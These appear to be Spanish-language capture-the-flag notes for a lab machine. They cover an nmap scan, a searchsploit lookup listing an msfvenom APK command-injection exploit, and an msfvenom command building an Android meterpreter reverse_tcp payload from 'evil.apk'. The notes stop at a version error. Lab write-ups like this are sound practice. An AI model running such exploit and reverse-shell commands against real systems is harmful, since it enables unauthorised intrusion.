### NMAP
```
nmap -p- -Pn -sS -sV 10.129.95.150
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
![[Pasted image 20260116200050.png]]

### WEB

Accedemos a 
```
http://10.129.95.150:5000/
```
![[Pasted image 20260116201323.png]]

Utilizamos el buscador de sploits para buscar uno de Werkzeug
![[Pasted image 20260116201458.png]]

Revisamos el código fuente de la web y observamos dos exploits que hacen referencia a Metasploit y a Venom

 Exploit Title                      |  Path
------------------------------------ ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection | multiple/local/49491.py

Venom Board - &#39;Post.php3&#39; Multiple SQL Injections | php/webapps/27053.txt

---------------------------------------------------------------------
![[Pasted image 20260116202741.png]]

Ejecutamos el exploit 
```
python 49491.py
```
![[Pasted image 20260116203733.png]]

Al lanzar el siguiente comando se observa un error, comprobamos la versión de metasploit y se ve que el exploit no es compatible con la versión actual.

```
msfvenom -x /tmp/tmpcw8tusv1/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

![[Pasted image 20260116204733.png]]
![[Pasted image 20260116204628.png]]
